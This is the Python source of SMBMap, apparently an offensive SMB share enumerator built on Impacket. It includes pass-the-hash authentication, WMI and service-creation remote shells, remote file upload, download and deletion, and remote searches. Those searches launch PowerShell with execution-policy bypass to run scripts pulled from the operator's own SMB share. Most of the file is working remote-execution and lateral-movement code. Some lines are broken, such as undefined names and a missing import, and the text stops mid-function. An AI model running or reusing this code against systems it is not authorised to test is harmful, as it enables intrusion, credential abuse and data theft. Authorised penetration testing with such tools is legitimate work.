#!/usr/bin/env python3
import sys
import traceback
import uuid
import signal
import string
import time
import random
import string
import logging
import configparser
import argparse
import ipaddress
import inspect
import csv
import getpass
import resource
import shutil

from threading import Thread, Event
from multiprocessing.pool import Pool
from impacket.examples import logger
from impacket import version, smbserver
from impacket.smbserver import SRVSServer
from impacket.smbserver import WKSTServer
from impacket.smbconnection import *
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smb3structs import *

import ntpath
import cmd
import os
import re

from termcolor import colored as termcolored

# A lot of this code was taken from Impacket's own examples
# https://github.com/SecureAuthCorp/impacket/
# Seriously, the most amazing Python library ever!!
# Many thanks to that dev team

rlimit = resource.getrlimit(resource.RLIMIT_NOFILE)
resource.setrlimit(resource.RLIMIT_NOFILE, (4096, rlimit[1]))

OUTPUT_FILENAME = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',10))
BATCH_FILENAME  = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10)) + '.bat'
SMBSERVER_DIR   = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZ', 10))
DUMMY_SHARE     = 'TMP'
PERM_DIR = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZ', 10))
PSUTIL_DIR= 'psutils'
PSUTIL_SHARE = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZ', 10))
VERBOSE = False
USE_TERMCOLOR=True
SEND_UPDATE_MSG=True
PORT_SCAN_TIMEOUT = .5
USE_CCACHE = False

banner = r"""
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
"""


def colored(msg, *args, **kwargs):
    global USE_TERMCOLOR
    if USE_TERMCOLOR:
        return termcolored(msg, *args, **kwargs)
    return msg


class Loader(Thread):
    def __init__(self, msg='Working on it', spinner='\\|/-'):
        Thread.__init__(self)
        self.__running = Event()
        self.__running.set()
        self.__flag = Event()
        self.__flag.set()
        self._spinner = spinner
        self._msg = msg
        self._padding = 0

    def update(self, msg):
        self._msg = msg
        self.calculate_padding()

    def terminate(self):
        self.__flag.set()
        self.__running.clear()

    def pause(self):
        self.__flag.clear()

    def resume(self):
        self.__flag.set()

    def cleanup(self):
        print(' ' * self._padding, end='\r')

    def calculate_padding(self):
        terminal_width = shutil.get_terminal_size((80, 24)).columns
        message_length = len(self._msg) + 10
        self._padding = max(terminal_width - message_length, 0)

    def run(self):
        global SEND_UPDATE_MSG
        while self.__running.is_set():
            for char in self._spinner:
                if SEND_UPDATE_MSG:
                    self.__flag.wait()
                    print(f"[{char}] {self._msg}{' ' * self._padding}", end='\r', flush=True)
                    time.sleep(0.05)

class SimpleSMBServer(Thread):
    def __init__(self, interface_address, port):
        Thread.__init__(self)
        self.smbserver = smbserver.SimpleSMBServer(listenAddress = interface_address, listenPort = int(port))
        self.smbserver.addShare(PSUTIL_SHARE, PSUTIL_DIR, shareComment='P0w3r$he11')
        self.smbserver.setSMB2Support(True)

    def run(self):
        self.smbserver.start()

    def stop(self):
        self.smbserver.stop()

class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.smb = None
        print('[+] Initializing SMB server..')

    def cleanup_server(self):
        logging.info('Cleaning up..')
        try:
            os.unlink(SMBSERVER_DIR + '/smb.log')
        except:
            pass
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = configparser.ConfigParser(allow_no_value=True)
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','nopsec')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file', SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0', 445), config_parser = smbConfig)

        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception as e:
            pass

        self.smb.processConfigFile()
        self.__srvsServer = SRVSServer()
        self.__srvsServer.daemon = True
        self.__wkstServer = WKSTServer()
        self.__wkstServer.daemon = True
        self.smb.registerNamedPipe('srvsvc',('127.0.0.1',self.__srvsServer.getListenPort()))
        self.smb.registerNamedPipe('wkssvc',('127.0.0.1',self.__wkstServer.getListenPort()))
        try:
            print('[+] SMB server started...')
            self.__srvsServer.start()
            self.__wkstServer.start()
            self.smb.serve_forever()
        except Exception as e:
            print('[!] Error starting SMB server: ', e)
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
                 noOutput=False, doKerberos=False, kdcHost=None, scr_output=True):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__disp_output = scr_output
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        if self.__noOutput is False:
            smbConnection = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
            dialect = smbConnection.getDialect()
            if dialect == SMB_DIALECT:
                logging.info("SMBv1 dialect used")
            elif dialect == SMB2_DIALECT_002:
                logging.info("SMBv2.0 dialect used")
            elif dialect == SMB2_DIALECT_21:
                logging.info("SMBv2.1 dialect used")
            else:
                logging.info("SMBv3.0 dialect used")
        else:
            smbConnection = None

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process,_ = iWbemServices.GetObject('Win32_Process')

            self.shell = RemoteShellWMI(self.__share, win32Process, smbConnection, self.__disp_output)
            if self.__command != ' ':
                output = self.shell.onecmd(self.__command)
            else:
                self.shell.cmdloop()
        except (Exception, KeyboardInterrupt) as e:
            logging.error(str(e))
            if smbConnection is not None:
                smbConnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            #sys.exit(1)

        if smbConnection is not None:
            smbConnection.logoff()
        dcom.disconnect()
        return output

class RemoteShellWMI(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection, disp_output=True):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = ''
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = 'C:\\'
        self.__noOutput = False
        self.__disp_output = disp_output
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        print("""
         lcd {path}                 - changes the current local directory to {path}
         exit                       - terminates the server process (and this session)
         put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
         get {file}                 - downloads pathname to the current local dir
         ! {cmd}                    - executes a local shell cmd
        """)

    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))

    def do_get(self, src_path):
        try:
            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath)
            filename = ntpath.basename(tail)
            fh = open(filename,'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
            fh.close()
        except Exception as e:
            logging.error(str(e))
            os.remove(filename)
            pass

    def do_put(self, s):
        try:
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = ''

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            dst_path = string.replace(dst_path, '/','\\')
            pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
            fh.close()
        except Exception as e:
            logging.critical(str(e))
            pass

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = self.__pwd + '>'
            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = self.__pwd + '>'
                self.__outputBuffer = ''
        else:
            if line != '':
                x = inspect.currentframe()
                y = inspect.getouterframes(x,2)
                return self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data.decode()

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                else:
                    pass
        self.__transferClient.deleteFile(self.__share, self.__output)
        return self.__output

    def execute_remote(self, data):
        command = self.__shell + data
        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        if self.__disp_output:
            print(self.__outputBuffer)
        __lastCmdOutput = self.__outputBuffer
        self.__outputBuffer = ''
        return __lastCmdOutput

class CMDEXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, noOutput=False,
                 doKerberos=None, kdcHost=None, mode='SHARE', share=None, port=445, command=None):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__serviceName = OUTPUT_FILENAME
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__share = share
        self.__mode  = mode
        self.shell = None
        self.command = command
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, remoteName, remoteHost):
        tringbinding = 'ncacn_np:%s[\\pipe\\svcctl]' % remoteName
        logging.debug('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        if hasattr(rpctransport,'setRemoteHost'):
            rpctransport.setRemoteHost(remoteHost)
        else:
            rpctransport.__dstip = remoteHost
        if hasattr(rpctransport,'preferred_dialect'):
            rpctransport.preferred_dialect(SMB_DIALECT)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
        #rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.shell = None
        try:
            if self.__mode == 'SERVER':
                serverThread = SMBServer()
                serverThread.daemon = True
                serverThread.start()
            self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName)
            self.shell.send_data(self.command)
            if self.__mode == 'SERVER':
                serverThread.stop()
        except  (Exception, KeyboardInterrupt) as e:
            print('[!] Something went wrong:', str(e))

class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = ''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc

        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
        except Exception as e:
            logging.critical(str(e))
            #print(e)
            #sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s<file://%25s/%25s>' % (self.__output, myIPaddr, DUMMY_SHARE)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()
        self.do_cd('')

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect()
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except:
           pass

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        # We just can't CD or mantain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ' )
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = self.__outputBuffer.replace('\r\n','') + '>'
            self.__outputBuffer = ''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data.decode()

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
            self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile

        logging.debug('Executing %s' % command)
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
        service = resp['lpServiceHandle']

        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print(self.__outputBuffer)
        self.__outputBuffer = ''


class SMBMap():
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }

    def __init__(self):
        self.recursive = False
        self.dir_only = False
        self.list_files = False
        self.admin_only = False
        self.loading = False
        self.verbose = True
        self.shares = {}
        self.isLoggedIn = False
        self.pattern = None
        self.grepable = False
        self.outfile = None
        self.csv = False
        self.csv_writer = None
        self.hosts = {}
        self.jobs = {}
        self.search_output_buffer = ''
        self.loader = None
        self.exclude = []

    def logout(self, host):
        try:
            for session in self.hosts[host]['smbconn']:
                session.logoff()
            return True
        except:
            return False

    def start_smb_server(self):
        try:
            smb_server = SimpleSMBServer('0.0.0.0', 445)
            smb_server.daemon = True
            smb_server.start()
            return smb_server
        except Exception as e:
            print('[!] Run as r00t, or maybe something is using port 445...')
            self.kill_loader()
            return False
            sys.exit(1)


    def start_file_search(self, host, pattern, share, search_path):
        try:
            myIPaddr = self.get_ip_address()
            job_name = uuid.uuid4().hex
            tmp_dir = self.exec_command(host, share, 'echo %TEMP%', disp_output=False).strip()
            if len(tmp_dir) == 0:
                tmp_dir = 'C:\\Windows\\Temp'

            tmp_bat_cmd = 'powershell -NoLogo -ExecutionPolicy bypass -Command " & {}Get-ChildItem {}\\*.* -Recurse -Exclude *.dll,*.exe,*.msi,*.jpg,*.gif,*.bmp,*.png,*.mp3,*.wav | Select-String -Pattern \'{}\' | Select-Object -Unique Path | out-string -width 220{}" 2>nul > {}\\{}.txt'.format('{', search_path, pattern, '}', tmp_dir, job_name)
            tmp_bat = open('./{}/{}.bat'.format(PSUTIL_DIR, job_name), 'w')
            tmp_bat.write(tmp_bat_cmd)
            tmp_bat.close()

            ps_command = 'powershell -ExecutionPolicy bypass -NoLogo -command "Start-Process """cmd.exe""" """/c \\\\{}\\{}\\{}.bat<file://%7b%7d/%7b%7d/%7b%7d.bat>""" "'.format(myIPaddr, PSUTIL_SHARE, job_name)
            success = self.exec_command(host, share, ps_command, disp_output=False)
            print('[+] Job {} started on {}, result will be stored at {}\\{}.txt'.format(job_name, host, tmp_dir, job_name))
            proc_id = self.get_job_procid(host, share, tmp_dir, job_name)
            if len(proc_id) > 0:
                proc_id = [j.strip() for j in proc_id.split('\n') if len(j) > 0]
            self.jobs[job_name] = { 'host' : host, 'share' : share, 'tmp' : tmp_dir , 'pattern' : pattern, 'start_time': time.perf_counter() , 'proc_id' : proc_id }
        except Exception as e:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            #print('[!] Something weird happened: {} on line {}'.format(e, exc_tb.tb_lineno))
            sys.stdout.flush()
            print('[!] Job creation failed on host: %s. Did you run as r00t?' % (host))

    def get_job_procid(self, host, share, path, job):
        try:
            myIPaddr = self.get_ip_address()
            file_path = '{}\\{}.txt'.format(path, job)
            command = 'powershell -NoLogo -ExecutionPolicy bypass -File \\\\{}\\{}\\Get-FileLockProcess.ps1<file://%7b%7d/%7b%7d/Get-FileLockProcess.ps1> "{}"'.format(myIPaddr, PSUTIL_SHARE, file_path)
            result = self.exec_command(host, share, command, disp_output=False)
            return result
        except Exception as e:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print('[!] WTF: {} on line {}'.format(e, exc_tb.tb_lineno))
            sys.stdout.flush()

    def get_search_results(self, timeout):
        print('[+] Checking on search results, be patient, drives tend to be big...')
        counter = 0
        num_jobs = len(list(self.jobs.keys()))
        start_time = time.perf_counter()
        while len(list(self.jobs.keys())) > 0:
            try:
                for job in list(self.jobs.keys()):
                    isItThere = self.exec_command(self.jobs[job]['host'], self.jobs[job]['share'], 'cmd /c "if exist {}\\{}.txt echo ImHere"'.format(self.jobs[job]['tmp'], job), disp_output=False)
                    result = self.exec_command(self.jobs[job]['host'], self.jobs[job]['share'], 'cmd /c "2>nul (>>{}\\{}.txt (call )) && (echo not locked) || (echo locked)"'.format(self.jobs[job]['tmp'], job), disp_output=False)
                    if 'not locked' ==  result.strip() and isItThere.strip() == 'ImHere':
                        dl_target = '%s%s\\%s.txt' % (self.jobs[job]['share'], self.jobs[job]['tmp'][2:], job)
                        host_dest = download_file(self.hosts[self.jobs[job]['host']]['smbconn'][0], dl_target)
                        counter += 1
                        self.search_output_buffer += 'Host: %s \t\tPattern: %s\n' % (self.jobs[job]['host'], self.jobs[job]['pattern'])
                        if os.stat(host_dest).st_size > 0:
                            results_file = open(host_dest)
                            self.search_output_buffer += results_file.read()
                            self.search_output_buffer += '\n'
                        else:
                            self.search_output_buffer += 'No matching patterns found\n\n'
                        print('[+] Job %d of %d completed on %s...' % (counter, num_jobs, self.jobs[job]['host']))
                        self.delete_file(self.jobs[job]['host'], dl_target)
                        os.remove('./{}/{}.bat'.format(PSUTIL_DIR, job))
                        self.jobs.pop(job, None)
                        if counter >= num_jobs:
                            break
                    else:
                        if time.perf_counter()-self.jobs[job]['start_time'] > int(timeout):
                            print('[!] Job {} is taking a long time....it\'s getting punted'.format(job))
                            for pid in self.jobs[job]['proc_id']:
                                kill_job = 'taskkill /PID {} /F'.format(pid)
                                success = self.exec_command(self.jobs[job]['host'], self.jobs[job]['share'], kill_job, disp_output=False)
                                os.remove('./{}/{}.bat'.format(PSUTIL_DIR, job))
                        time.sleep(10)
            except Exception as e:
                print('[!]', e)
        print('[+] All jobs complete')
        print(self.search_output_buffer)

    def get_ip_address(self):
        myIPaddr = ''
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('10.255.255.255', 1))
            myIPaddr = s.getsockname()[0]
        except:
            myIPaddr = '127.0.0.1'
        finally:
            s.close()
        return myIPaddr

    def list_drives(self, host, share):
        counter = 0
        disks = []
        try:
            local_disks = self.exec_command( host, share, 'fsutil fsinfo drives', disp_output=False)
            net_disks_raw = self.exec_command( host, share, 'net use', disp_output=False)
            net_disks = ''
            for line in net_disks_raw.split('\n'):
                if ':' in line:
                    data = line.split(' ')
                    data = [a for a in data if a != '']
                    for item in data:
                        counter += 1
                        net_disks += '%s\t\t' % (item)
                        if '\\' in item:
                            net_disks += ' '.join(data[counter:])
                            break
                    disks.append(net_disks)
                    net_disks = ''
            print('[+] Host %s Local %s' % (host, local_disks.strip()))
            print('[+] Host %s Net Drive(s):' % (host))
            if len(disks) > 0:
                for disk in disks:
                     print('\t%s' % (disk))
            else:
                print('[*] No mapped network drives')
            pass
        except Exception as e:
            print('[!] Error on {}: {}'.format(host, e))

    def kill_loader(self):
        self.loading = False
        if self.loader:
            self.loader.terminate()
            self.loader.join()
            self.loader.cleanup()
            self.loader = None

    def filter_results(self, pattern):
        pass

    def exec_command(self, host, share, command, disp_output=True, host_name=None, mode='wmi'):
        try:
            if self.is_ntlm(self.hosts[host]['passwd']):
                hashes = self.hosts[host]['passwd']
            else:
                hashes = None

            if mode == 'wmi':
                executer = WMIEXEC(username=self.hosts[host]['user'], password=self.hosts[host]['passwd'],  hashes=hashes, share=share, command=command, scr_output=disp_output)
                result = executer.run(host)
            else:
                executer = CMDEXEC(username=self.hosts[host]['user'], password=self.hosts[host]['passwd'],  hashes=hashes, share=share, command=command)
                result = executer.run(host_name, host)
            return result
        except Exception as e:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            print('[!] Something weird happened on ({}) {} on line {}'.format(host, e, exc_tb.tb_lineno))
            sys.stdout.flush()
            return none

    def delete_file(self, host, path):
        path = path.replace('/','\\')
        path = ntpath.normpath(path)
        filename = path.split('\\')[-1]
        share = path.split('\\')[0]
        path = path.replace(share, '', 1)
        path = path.replace(filename, '')
        try:
            self.hosts[host]['smbconn'][0].deleteFile(share, path + filename)
            if self.verbose:
                print('[+] File successfully deleted: %s%s%s' % (share, path, filename))
        except SessionError as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                print('[!] Error deleting file, access denied')
            elif 'STATUS_INVALID_PARAMETER' in str(e):
                print('[!] Error deleting file, invalid path')
            elif 'STATUS_SHARING_VIOLATION' in str(e):
                print('[!] Error deleting file, sharing violation')
            elif 'STATUS_FILE_IS_A_DIRECTORY' in str(e):
                self.hosts[host]['smbconn'][0].deleteDirectory(share, path)
                #self.remove_dir(host, share, path)
            else:
                print('[!] Error deleting file %s%s%s, unknown error' % (share, path, filename))
                print('[!]', e)
        except Exception as e:
            print('[!] Error deleting file %s%s%s, unknown error' % (share, path, filename))
            print('[!]', e)

    def upload_file(self, host, src, dst):
        dst = dst.replace('/','\\')
        dst = ntpath.normpath(dst)
        dst = dst.split('\\')
        share = dst[0]
        dst = '\\'.join(dst[1:])
        if os.path.exists(src):
            print('[+] Starting upload: %s (%s bytes)' % (src, os.path.getsize(src)))
            upFile = open(src, 'rb')
            try:
                self.hosts[host]['smbconn'][0].putFile(share, dst, upFile.read)
                print('[+] Upload complete')
            except Exception as e:
                print('[!]', e)
                print('[!] Error uploading file, you need to include destination file name in the path')
            upFile.close()
        else:
            print('[!] Invalid source. File does not exist')
            sys.exit()

    def is_ntlm(self, password):
        try:
            if len(password.split(':')) == 2:
                lm, ntlm = password.split(':')
                if len(lm) == 32 and len(ntlm) == 32:
                    return True
                else:
                    return False
        except Exception as e:
            return False

def init_host( host_args ):
    ip = host_args['ip']
    port = host_args['port']
    user = host_args['user']
    passwd = host_args['passwd']
    domain = host_args['domain']
    lmhash = host_args['lmhash']
    nthash = host_args['nthash']
    kdc_host = host_args['kdc_host']
    try:
        return { 'ip' : socket.gethostbyname(ip), 'name' : socket.getnameinfo((ip, port),0)[0] , 'port' : port, 'user' : user, 'passwd' : passwd, 'domain' : domain, 'lmhash' : lmhash, 'nthash' : nthash, 'smbconn' : [] ,'kdc' : kdc_host }
    except Exception as e:
        return { 'ip' : socket.gethostbyname(ip), 'name' : ip, 'port' : 445, 'user' : user, 'passwd' : passwd, 'domain' : domain, 'lmhash' : lmhash, 'nthash' : nthash , 'smbconn' : [] , 'kdc' : kdc_host }


def close_smb_connection( logoff_args ):
    try:
        smbconn = logoff_args['smbconn']
        return smbconn.logoff()
    except:
        return False

def get_version( version_args ):
    smbconn = version_args['smbconn']
    host = version_args['host']

    domain = smbconn.getServerDomain()
    if not domain:
        domain = smbconn.getServerName()
    version = smbconn.getServerOS()
    name = smbconn.getServerName()

    return { 'Host' : '{:<16}'.format(host), 'Version' : version, 'Name' : name, 'Domain' : domain }

def signal_handler(signal, frame):
    print('[*] You pressed Ctrl+C!')
    os._exit(0)

def find_open_ports(address):
    result = 1
    address = address.strip()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(PORT_SCAN_TIMEOUT)
        result = sock.connect_ex((address, 445))
        if result == 0:
            sock.close()
            return address
        else:
            return False
    except Exception as e:
        return False

def to_string(smb_tree, mysmb):
    if mysmb.verbose:
        header = '\tDisk{}\tPermissions\tComment\n'.format(' '.ljust(50))
        header += '\t----{}\t-----------\t-------'.format(' '.ljust(50))
    heads_up = False
    priv_status = ''
    try:
        for host in smb_tree.keys():
            if mysmb.hosts[host]['smbconn'][0].isGuestSession() > 0:
                priv_status = 'Status: ' + colored('Guest session   \t', 'yellow')
            try:
                if smb_tree[host]['ADMIN$']['privs'] == 'READ, WRITE':
                    priv_status = 'Status: ' + colored('ADMIN!!!', 'green', attrs=['bold','underline']) + '   \t'
                    if mysmb.admin_only:
                        print(' '*100)
                        print('[+] IP: {}:{}\tName: {}\t{}'.format(host, mysmb.hosts[host]['port'], mysmb.hosts[host]['name'].ljust(20), priv_status ))
                else:
                    priv_status = 'Status: ' + colored ('Authenticated', 'green')
            except:
                priv_status = 'Status: ' + colored ('NULL Session', 'green')

            for share in smb_tree[host].keys():
                if smb_tree[host][share]['privs'] == 'READ, WRITE':
                    share_name_privs = colored('READ, WRITE', 'green')
                if smb_tree[host][share]['privs'] == 'READ ONLY':
                    share_name_privs = colored('READ ONLY', 'yellow')
                if smb_tree[host][share]['privs'] == 'NO ACCESS':
                    share_name_privs = colored('NO ACCESS', 'red')

                if mysmb.admin_only == False:
                    if heads_up == False and mysmb.verbose:
                        print(' '*100)
                        print('[+] IP: {}:{}\tName: {}\t{}'.format(host, mysmb.hosts[host]['port'], mysmb.hosts[host]['name'].ljust(20), priv_status ))
                        print(header)
                        heads_up = True

                    if mysmb.verbose == True:
                        print('\t{}\t{}\t{}'.format(share.ljust(50), share_name_privs, smb_tree[host][share]['comment'] ) )
                    #elif mysmb.verbose == False and smb_tree[host][share]['privs'] != 'NO ACCESS':
